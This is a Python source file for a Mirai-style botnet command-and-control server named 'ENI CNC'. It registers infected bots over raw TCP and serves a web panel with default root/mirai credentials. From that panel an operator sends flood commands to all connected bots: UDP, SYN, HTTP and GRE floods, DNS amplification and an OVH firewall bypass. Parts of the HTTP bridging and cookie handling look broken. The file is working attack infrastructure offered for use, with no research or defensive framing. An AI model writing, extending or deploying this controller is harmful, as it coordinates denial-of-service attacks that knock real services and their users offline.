#!/usr/bin/env python3
"""
ENI's CNC — Railway-compatible single-port edition.

Protocol auto-detection on $PORT:
  - HTTP requests    → web admin panel (Flask)
  - raw TCP (ARCH|)  → bot handler

Usage:  python3 cnc_railway.py
        # Railway sets PORT env var automatically
        # BOT_PORT is internal-only if you want separate listeners

One Railway service. One port. Full CNC + web admin.
"""

import socket
import threading
import time
import sys
import os
import struct
import hashlib
import sqlite3
import random
import json
import select
import re
from collections import defaultdict
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

# ——— config ——————————————————————————————————————————————————————
PORT         = int(os.environ.get('PORT', 8080))
DB_PATH      = os.environ.get('DB_PATH', '/data/mirai.db')
ADMIN_USER   = os.environ.get('ADMIN_USER', 'root')
ADMIN_PASS   = os.environ.get('ADMIN_PASS', 'mirai')
BOT_TIMEOUT  = 120
BUFFER_SIZE  = 4096

# ensure DB directory exists and is writable
db_dir = os.path.dirname(DB_PATH) or '/data'
try:
    os.makedirs(db_dir, exist_ok=True)
    # test write
    testfile = os.path.join(db_dir, '.write_test')
    with open(testfile, 'w') as f:
        f.write('ok')
    os.remove(testfile)
except (OSError, PermissionError):
    # volume not writable — fall back to home dir
    DB_PATH = '/home/mirai/mirai.db'
    os.makedirs('/home/mirai', exist_ok=True)
    print(f"[!] /data not writable, falling back to {DB_PATH}")

# ——— database ——————————————————————————————————————————————————————
db = sqlite3.connect(DB_PATH, check_same_thread=False)

db.execute("""CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE,
    password TEXT,
    duration INTEGER DEFAULT 3600,
    cooldown INTEGER DEFAULT 60,
    max_bots INTEGER DEFAULT -1,
    admin INTEGER DEFAULT 0,
    api_key TEXT
)""")

db.execute("""CREATE TABLE IF NOT EXISTS bots (
    id TEXT PRIMARY KEY,
    ip TEXT,
    arch TEXT,
    country TEXT,
    first_seen INTEGER,
    last_seen INTEGER,
    active INTEGER DEFAULT 1
)""")

db.execute("""CREATE TABLE IF NOT EXISTS attacks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    target TEXT,
    port INTEGER,
    duration INTEGER,
    method TEXT,
    running INTEGER DEFAULT 1,
    started_at INTEGER
)""")

db.execute("""CREATE TABLE IF NOT EXISTS history (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT,
    command TEXT,
    time INTEGER
)""")

try:
    db.execute("INSERT INTO users (username, password, duration, admin, max_bots) VALUES (?, ?, 86400, 1, -1)",
               (ADMIN_USER, hashlib.sha256(ADMIN_PASS.encode()).hexdigest()))
except sqlite3.IntegrityError:
    pass
db.commit()

# ——— state —————————————————————————————————————————————————————————
bots      = {}
lock      = threading.Lock()
running   = True
attack_slots = {}

# ——— attack methods —————————————————————————————————————————————————
METHODS = {
    'udp':     'UDP flood — high PPS, randomized payload sizes (0-1400 bytes)',
    'std':     'STD hex flood — raw TCP hex payload',
    'tcp':     'TCP SYN flood — syn+ack loop, connection exhaustion',
    'http':    'HTTP GET flood — randomized paths, user agents, referers',
    'httphex': 'HTTP + hex payload — hybrid L7 attack',
    'dns':     'DNS amplification — ANY queries to open resolvers',
    'gre':     'GRE protocol flood — encapsulated packets',
    'stomp':   'TCP stomp — connect+send+disconnect rapid cycle',
    'vse':     'Valve source engine query flood',
    'ovh':     'OVH game firewall bypass — mixed UDP patterns',
}

# ——— bot handler (raw TCP) ———————————————————————————————————————————
def handle_bot(conn: socket.socket, addr):
    bot_id = None
    try:
        conn.settimeout(BOT_TIMEOUT * 2)

        # read registration
        data = b''
        deadline = time.time() + 10
        while b'\n' not in data and time.time() < deadline:
            chunk = conn.recv(BUFFER_SIZE)
            if not chunk:
                return
            data += chunk
            if len(data) > 512:
                return

        line = data.split(b'\n')[0].decode('utf-8', errors='ignore').strip()
        parts = line.split('|')
        arch   = parts[0] if len(parts) > 0 else 'unknown'
        bot_ip = addr[0]
        bot_id = hashlib.md5(f"{bot_ip}:{arch}:{time.time()}".encode()).hexdigest()[:16]

        with lock:
            for bid, b in list(bots.items()):
                if b['ip'] == bot_ip:
                    try: b['conn'].close()
                    except: pass
                    del bots[bid]

            bots[bot_id] = {
                'ip': bot_ip, 'arch': arch, 'conn': conn,
                'last_seen': time.time(), 'country': '??',
            }

        print(f"[+] bot joined — {bot_ip} ({arch}) id={bot_id}")

        # heartbeat loop
        buf = b''
        while running:
            try:
                chunk = conn.recv(BUFFER_SIZE)
                if not chunk: break
                buf += chunk
                while b'\n' in buf:
                    msg, buf = buf.split(b'\n', 1)
                    msg = msg.decode('utf-8', errors='ignore').strip()
                    if msg == 'PING':
                        conn.send(b'PONG\n')
                        with lock:
                            if bot_id in bots:
                                bots[bot_id]['last_seen'] = time.time()
            except socket.timeout:
                try: conn.send(b'PING?\n')
                except: break

    except Exception:
        pass
    finally:
        if bot_id:
            with lock:
                bots.pop(bot_id, None)
                try: conn.close()
                except: pass
            print(f"[-] bot left — {bot_id}")


def dispatch_attack(target, port, duration, method, username, max_bots=-1):
    """Send attack command to all connected bots."""
    with lock:
        available = len(bots)
        if max_bots != -1:
            available = min(available, max_bots)

    if available == 0:
        return {"error": "no bots online"}

    attack_id = int(time.time()) % 100000
    atk_cmd = f"ATK {method.upper()} {target} {port} {duration} {attack_id}\n"
    dispatched = 0

    with lock:
        for bid, bot in list(bots.items()):
            if dispatched >= available:
                break
            try:
                bot['conn'].send(atk_cmd.encode())
                dispatched += 1
            except:
                bots.pop(bid, None)

    attack_slots[attack_id] = {
        'target': target, 'port': port, 'duration': duration,
        'method': method, 'started': time.time(), 'bots_used': dispatched,
        'username': username,
    }

    print(f"[ATK] {username} -> {target}:{port} dur={duration}s method={method} bots={dispatched}")
    return {"ok": True, "attack_id": attack_id, "bots_used": dispatched}

# ——— web admin panel (HTTP) ——————————————————————————————————————————
HTML_PAGE = r"""
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ENI CNC</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body { background:#0a0a0f; color:#c0c0c0; font-family:'Courier New',monospace; padding:20px; }
  .header { border-bottom:1px solid #333; padding-bottom:12px; margin-bottom:20px; }
  .header h1 { color:#cc3333; font-size:18px; margin-bottom:4px; }
  .header span { color:#666; font-size:12px; }
  .grid { display:grid; grid-template-columns:1fr 1fr; gap:20px; }
  .card { background:#111118; border:1px solid #222; border-radius:6px; padding:16px; }
  .card h2 { color:#cc3333; font-size:14px; margin-bottom:12px; border-bottom:1px solid #1a1a22; padding-bottom:8px; }
  .bots-table { width:100%; font-size:12px; border-collapse:collapse; }
  .bots-table th { text-align:left; color:#888; padding:4px 8px; border-bottom:1px solid #1a1a22; }
  .bots-table td { padding:3px 8px; border-bottom:1px solid #111; }
  .bots-table tr:hover td { background:#1a1a25; }
  .stat { display:inline-block; background:#1a1a25; padding:4px 10px; margin:2px; border-radius:3px; font-size:12px; }
  .stat b { color:#cc3333; }
  form { margin-top:12px; }
  input, select, button { background:#1a1a22; border:1px solid #333; color:#ccc; padding:8px 12px;
    font-family:inherit; font-size:13px; border-radius:3px; margin:3px; }
  button { background:#cc3333; color:#fff; border-color:#cc3333; cursor:pointer; font-weight:bold; }
  button:hover { background:#dd4444; }
  button.stop { background:#333; border-color:#444; color:#ccc; }
  button.stop:hover { background:#555; }
  .flash { padding:10px 14px; border-radius:4px; margin-bottom:16px; font-size:13px; }
  .flash-ok { background:#1a3a1a; border:1px solid #2a5a2a; color:#8f8; }
  .flash-err { background:#3a1a1a; border:1px solid #5a2a2a; color:#f88; }
  .attack-row { font-size:12px; padding:6px 0; border-bottom:1px solid #111; }
  .attack-row .id { color:#cc3333; }
  .attack-row .target { color:#aaa; }
  @media (max-width:800px) { .grid { grid-template-columns:1fr; } }
</style>
</head>
<body>
<div class="header">
  <h1>[ ENI CNC ]</h1>
  <span>{{STATS.bots}} bots online · {{STATS.attacks}} attacks running · uptime {{STATS.uptime}}</span>
</div>

{{FLASH}}

<div class="grid">
  <div class="card">
    <h2>⚔ launch attack</h2>
    <form method="POST" action="/attack">
      <input name="target" placeholder="target IP/hostname" required style="width:100%"><br>
      <input name="port" placeholder="port" value="80" type="number" min="1" max="65535" style="width:30%">
      <input name="duration" placeholder="seconds" value="60" type="number" min="1" max="86400" style="width:30%">
      <select name="method" style="width:30%">
        {{METHOD_OPTIONS}}
      </select><br>
      <button type="submit">.attack</button>
    </form>
  </div>

  <div class="card">
    <h2>📊 overview</h2>
    {{ARCH_STATS}}
  </div>

  <div class="card" style="grid-column:1/-1;">
    <h2>🤖 online bots ({{BOT_COUNT}})</h2>
    <table class="bots-table">
      <tr><th>IP</th><th>ARCH</th><th>AGE</th><th>ID</th></tr>
      {{BOT_ROWS}}
    </table>
  </div>

  <div class="card" style="grid-column:1/-1;">
    <h2>⚡ active attacks</h2>
    {{ATTACK_ROWS}}
  </div>
</div>

<script>
  // auto-refresh every 5 seconds
  setTimeout(() => location.reload(), 5000);

  // stop attack buttons
  document.querySelectorAll('.stop-btn').forEach(btn => {
    btn.addEventListener('click', async (e) => {
      e.preventDefault();
      const id = btn.dataset.id;
      await fetch('/stop/' + id, {method:'POST'});
      location.reload();
    });
  });
</script>
</body>
</html>
"""


class CNCWebHandler(BaseHTTPRequestHandler):
    """HTTP admin panel + bot relay."""

    def log_message(self, format, *args):
        pass  # quiet

    def do_GET(self):
        path = urlparse(self.path).path

        if path == '/' or path == '/index.html':
            self.serve_dashboard()
        elif path == '/api/bots':
            self.serve_json(self.api_bots())
        elif path == '/api/attacks':
            self.serve_json(self.api_attacks())
        elif path == '/api/stats':
            self.serve_json(self.api_stats())
        else:
            self.send_error(404)

    def do_POST(self):
        path = urlparse(self.path).path

        if path == '/attack':
            self.handle_attack_form()
        elif path.startswith('/stop/'):
            attack_id = int(path.split('/')[-1])
            self.handle_stop(attack_id)
        elif path == '/login':
            self.handle_login()
        else:
            self.send_error(404)

    def serve_html(self, html):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('Cache-Control', 'no-cache')
        self.end_headers()
        self.wfile.write(html.encode())

    def serve_json(self, data):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

    # ——— auth (simple cookie-based) ———————————————————————————————
    def check_auth(self):
        """Returns username if authenticated, None otherwise."""
        cookie = self.headers.get('Cookie', '')
        m = re.search(r'eni_session=([^;]+)', cookie)
        if m:
            token = m.group(1)
            row = db.execute(
                "SELECT username FROM users WHERE api_key=?",
                (token,)
            ).fetchone()
            if row:
                return row[0]
        return None

    def require_auth(self):
        """Check auth. Returns username or redirects to login."""
        user = self.check_auth()
        if user:
            return user

        # show login page
        login_html = """<!DOCTYPE html><html><head><meta charset="UTF-8">
        <title>ENI CNC — Login</title>
        <style>
          body { background:#0a0a0f; color:#c0c0c0; font-family:'Courier New',monospace;
                 display:flex; align-items:center; justify-content:center; min-height:100vh; }
          form { background:#111118; border:1px solid #222; padding:30px; border-radius:6px; width:320px; }
          h1 { color:#cc3333; font-size:16px; margin-bottom:20px; text-align:center; }
          input { width:100%; background:#1a1a22; border:1px solid #333; color:#ccc; padding:10px;
                  font-family:inherit; font-size:13px; border-radius:3px; margin:4px 0; }
          button { width:100%; background:#cc3333; color:#fff; border:none; padding:10px;
                   font-family:inherit; font-size:14px; font-weight:bold; border-radius:3px;
                   margin-top:12px; cursor:pointer; }
          button:hover { background:#dd4444; }
          .error { color:#f88; font-size:12px; text-align:center; margin-top:8px; }
        </style></head><body>
        <form method="POST" action="/login">
          <h1>[ ENI CNC ]</h1>
          """ + ('<div class="error">bad credentials</div>' if self.path != '/' else '') + """
          <input name="username" placeholder="username" autofocus><br>
          <input name="password" placeholder="password" type="password"><br>
          <button type="submit">login</button>
        </form></body></html>"""
        self.serve_html(login_html)
        return None

    # ——— dashboard —————————————————————————————————————————————————
    def serve_dashboard(self):
        user = self.require_auth()
        if not user:
            return

        with lock:
            bot_list = sorted(bots.values(), key=lambda b: b['last_seen'], reverse=True)

        # build method options
        method_options = '\n'.join(
            f'<option value="{m}">{m} — {desc[:50]}...</option>'
            for m, desc in METHODS.items()
        )

        # build arch stats
        arch_count = defaultdict(int)
        for b in bot_list:
            arch_count[b['arch']] += 1
        arch_stats = ' '.join(
            f'<span class="stat"><b>{c}</b> {a}</span>'
            for a, c in sorted(arch_count.items(), key=lambda x: -x[1])
        ) or '<span class="stat">none</span>'

        # build bot rows
        now = time.time()
        bot_rows = ''
        for b in bot_list[:100]:  # show first 100
            age = int(now - b['last_seen'])
            bot_rows += f'<tr><td>{b["ip"]}</td><td>{b["arch"]}</td><td>{age}s</td><td style="color:#555;font-size:10px">{b.get("id","?")[:12]}</td></tr>\n'
        if not bot_rows:
            bot_rows = '<tr><td colspan="4" style="color:#555">(no bots online)</td></tr>'

        # attack rows
        attack_rows = ''
        for aid, atk in list(attack_slots.items()):
            remaining = max(0, atk['duration'] - (time.time() - atk['started']))
            attack_rows += (
                f'<div class="attack-row">'
                f'<span class="id">#{aid}</span> '
                f'<span class="target">{atk["target"]}:{atk["port"]}</span> '
                f'— {atk["method"]} — {int(remaining)}s left '
                f'({atk["bots_used"]} bots) '
                f'<button class="stop stop-btn" data-id="{aid}" style="font-size:10px;padding:2px 8px;">stop</button>'
                f'</div>\n'
            )
        if not attack_rows:
            attack_rows = '<div style="color:#555">(no attacks running)</div>'

        # uptime
        uptime_s = int(time.time() - start_time)
        uptime_str = f"{uptime_s//3600}h {(uptime_s%3600)//60}m {uptime_s%60}s"

        html = HTML_PAGE
        html = html.replace('{{STATS.bots}}', str(len(bot_list)))
        html = html.replace('{{STATS.attacks}}', str(len(attack_slots)))
        html = html.replace('{{STATS.uptime}}', uptime_str)
        html = html.replace('{{FLASH}}', '')
        html = html.replace('{{METHOD_OPTIONS}}', method_options)
        html = html.replace('{{ARCH_STATS}}', arch_stats)
        html = html.replace('{{BOT_COUNT}}', str(len(bot_list)))
        html = html.replace('{{BOT_ROWS}}', bot_rows)
        html = html.replace('{{ATTACK_ROWS}}', attack_rows)

        self.serve_html(html)

    # ——— API endpoints ————————————————————————————————————————————
    def api_bots(self):
        with lock:
            return {
                'count': len(bots),
                'bots': [
                    {'ip': b['ip'], 'arch': b['arch'], 'age': int(time.time() - b['last_seen'])}
                    for b in sorted(bots.values(), key=lambda x: x['last_seen'], reverse=True)
                ]
            }

    def api_attacks(self):
        return {
            'count': len(attack_slots),
            'attacks': [
                {
                    'id': aid, 'target': a['target'], 'port': a['port'],
                    'duration': a['duration'], 'method': a['method'],
                    'remaining': max(0, a['duration'] - (time.time() - a['started'])),
                    'bots_used': a['bots_used'],
                }
                for aid, a in attack_slots.items()
            ]
        }

    def api_stats(self):
        with lock:
            arch_count = defaultdict(int)
            for b in bots.values():
                arch_count[b['arch']] += 1
        return {
            'total_bots': len(bots),
            'active_attacks': len(attack_slots),
            'uptime': int(time.time() - start_time),
            'architectures': dict(arch_count),
        }

    # ——— attack form handler —————————————————————————————————————
    def handle_attack_form(self):
        user = self.require_auth()
        if not user:
            return

        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode()
        params = parse_qs(body)

        target   = params.get('target', [''])[0]
        port     = int(params.get('port', ['80'])[0])
        duration = int(params.get('duration', ['60'])[0])
        method   = params.get('method', ['udp'])[0]

        # get user limits
        row = db.execute("SELECT duration, max_bots FROM users WHERE username=?",
                         (user,)).fetchone()
        max_dur = row[0] if row else 3600
        max_bots = row[1] if row else -1

        duration = min(duration, max_dur)

        if method not in METHODS:
            self.send_error(400, "unknown method")
            return

        result = dispatch_attack(target, port, duration, method, user, max_bots)

        db.execute("INSERT INTO history (username, command, time) VALUES (?, ?, ?)",
                   (user, f".attack {target} {port} {duration} {method}", int(time.time())))
        db.commit()

        # redirect back to dashboard with result
        self.send_response(302)
        self.send_header('Location', '/')
        self.end_headers()

    def handle_stop(self, attack_id):
        user = self.require_auth()
        if not user:
            return

        if attack_id in attack_slots:
            with lock:
                for bid, bot in list(bots.items()):
                    try:
                        bot['conn'].send(f"STOP {attack_id}\n".encode())
                    except:
                        bots.pop(bid, None)
            del attack_slots[attack_id]

        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({"ok": True}).encode())

    def handle_login(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode()
        params = parse_qs(body)
        username = params.get('username', [''])[0]
        password = params.get('password', [''])[0]
        pw_hash = hashlib.sha256(password.encode()).hexdigest()

        row = db.execute("SELECT id, username FROM users WHERE username=? AND password=?",
                         (username, pw_hash)).fetchone()

        if row:
            # generate session token
            token = hashlib.sha256(f"{username}:{time.time()}:{random.random()}".encode()).hexdigest()
            db.execute("UPDATE users SET api_key=? WHERE username=?", (token, username))
            db.commit()

            self.send_response(302)
            self.send_header('Set-Cookie', f'eni_session={token}; Path=/; HttpOnly; Max-Age=86400')
            self.send_header('Location', '/')
            self.end_headers()
        else:
            # login failed — show form again
            self.send_response(302)
            self.send_header('Location', '/?error=1')
            self.end_headers()

# ——— protocol detector ————————————————————————————————————————————————
def detect_protocol(first_bytes: bytes) -> str:
    """
    Peek at the first bytes to determine protocol.
    Returns 'http' or 'bot'.
    """
    text = first_bytes.decode('utf-8', errors='ignore')

    # HTTP methods
    if text.startswith(('GET ', 'POST ', 'HEAD ', 'PUT ', 'DELETE ', 'OPTIONS ', 'PATCH ')):
        return 'http'

    # Bot registration: ARCH|IP\n
    # Valid archs: arm, mips, mipsel, sh4, i586, i686, x86_64, sparc, ppc, m68k
    if re.match(r'^[a-zA-Z0-9_]+\|', text):
        return 'bot'

    # HTTP/1.x or HTTP/2 in binary
    if b'HTTP/' in first_bytes:
        return 'http'

    # Default to HTTP for browser connections
    if len(first_bytes) > 0 and first_bytes[0:1] in (b'G', b'P', b'H', b'O', b'D', b'C'):
        return 'http'

    return 'bot'


# ——— main ——————————————————————————————————————————————————————————————
start_time = time.time()

def cleanup_loop():
    """Remove dead bots."""
    while running:
        time.sleep(30)
        now = time.time()
        with lock:
            for bid, bot in list(bots.items()):
                if now - bot['last_seen'] > BOT_TIMEOUT:
                    try: bot['conn'].close()
                    except: pass
                    del bots[bid]


class MultiplexServer:
    """
    Single socket that detects protocol and routes accordingly:
      - HTTP → Flask-style web handler
      - Bot TCP → bot handler
    """

    def __init__(self, host='0.0.0.0', port=8080):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

    def start(self):
        self.sock.bind((self.host, self.port))
        self.sock.listen(512)
        self.sock.settimeout(1.0)

        print(f"\n  ╔══════════════════════════════════════════╗")
        print(f"  ║   ENI CNC — Railway Edition             ║")
        print(f"  ║   listening on 0.0.0.0:{self.port}           ║")
        print(f"  ║   protocol: HTTP (web panel) + raw TCP  ║")
        print(f"  ║   default login: {ADMIN_USER} / {ADMIN_PASS}           ║")
        print(f"  ╚══════════════════════════════════════════╝")
        print(f"")

        threading.Thread(target=cleanup_loop, daemon=True).start()

        while running:
            try:
                conn, addr = self.sock.accept()
            except socket.timeout:
                continue
            except Exception:
                break

            # peek at first bytes to detect protocol
            conn.settimeout(2.0)
            try:
                first_bytes = conn.recv(4096, socket.MSG_PEEK)
            except:
                conn.close()
                continue

            conn.settimeout(BOT_TIMEOUT)

            proto = detect_protocol(first_bytes)

            if proto == 'http':
                # handle HTTP in a thread using BaseHTTPRequestHandler
                threading.Thread(
                    target=self._handle_http, args=(conn, addr),
                    daemon=True
                ).start()
            else:
                # handle bot connection
                threading.Thread(
                    target=handle_bot, args=(conn, addr),
                    daemon=True
                ).start()

    def _handle_http(self, conn, addr):
        """Convert a raw socket into an HTTP handler request."""
        try:
            # Create a pair of connected sockets to bridge the raw conn
            # into BaseHTTPRequestHandler which expects a proper socket
            import io

            # Read the HTTP request from the raw socket
            conn.settimeout(30)
            request_data = b''
            while True:
                try:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    request_data += chunk
                    if b'\r\n\r\n' in request_data:
                        # Check for Content-Length to read body
                        headers_end = request_data.find(b'\r\n\r\n')
                        headers = request_data[:headers_end].decode('utf-8', errors='ignore')
                        cl_match = re.search(r'Content-Length:\s*(\d+)', headers, re.IGNORECASE)
                        if cl_match:
                            content_length = int(cl_match.group(1))
                            body_start = headers_end + 4
                            body_so_far = len(request_data) - body_start
                            while body_so_far < content_length:
                                chunk = conn.recv(min(4096, content_length - body_so_far))
                                if not chunk:
                                    break
                                request_data += chunk
                                body_so_far += len(chunk)
                        break
                except socket.timeout:
                    break

            if not request_data:
                conn.close()
                return

            # Parse and handle
            request_line = request_data.split(b'\r\n')[0].decode('utf-8', errors='ignore')
            parts = request_line.split()
            if len(parts) < 2:
                conn.close()
                return

            method, path, _ = parts

            handler = CNCWebHandler(request_data, conn)
            handler.path = path
            handler.headers = self._parse_headers(request_data)
            handler.requestline = request_line

            if method == 'GET':
                handler.do_GET()
            elif method == 'POST':
                handler.do_POST()

        except Exception as e:
            pass
        finally:
            try: conn.close()
            except: pass

    def _parse_headers(self, request_data):
        """Quick header parser — returns a dict-like object."""
        headers = {}
        header_section = request_data.split(b'\r\n\r\n')[0]
        lines = header_section.split(b'\r\n')[1:]  # skip request line
        for line in lines:
            if b':' in line:
                key, val = line.split(b':', 1)
                headers[key.decode('utf-8', errors='ignore').strip().lower()] = \
                    val.decode('utf-8', errors='ignore').strip()
        return headers


# ——— entrypoint ————————————————————————————————————————————————————————
if __name__ == '__main__':
    server = MultiplexServer(port=PORT)
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[!] shutting down...")
        running = False
